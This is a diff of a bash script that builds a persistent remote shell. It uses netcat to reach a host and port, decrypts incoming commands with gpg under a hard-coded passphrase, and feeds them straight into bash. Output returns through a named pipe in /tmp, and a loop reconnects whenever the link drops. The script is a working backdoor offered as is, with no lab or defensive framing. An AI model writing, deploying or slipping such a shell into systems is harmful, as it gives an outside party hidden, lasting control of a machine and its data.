@@ -1,16 +1,16 @@
 #!/usr/bin/env bash
-pass=123
-pipe=/tmp/pipe-server
-port=56622
-host=0.0.0.0
 
-gpg_(){
-  local mode=$1
-  gpg --batch --quiet -a --passphrase $pass --pinentry-mode loopback --allow-multiple-messages $mode 
-}
-export -f gpg_
+pass="123" # This should be unique for every client-server pair/channel
+host="0.0.0.0"
+port="56622"
 
-rm -f $pipe
-mkfifo $pipe
+gpg_filter(){
+    gpg --batch --quiet --armor --output - --passphrase "${pass}" --allow-multiple-messages --decrypt -
+} 2>/dev/null
 
-cat $pipe 2>/dev/null | nc $host $port | gpg_ -d 2>/dev/null | bash &> $pipe
+pipe="/tmp/pipe"; mkfifo "${pipe}" 2>/dev/null
+
+# Loop makes sure connection is resumed if closed
+while :;do
+  nc "${host}" "${port}" < "${pipe}" 2>/dev/null | gpg_filter | bash &> "${pipe}"
+done
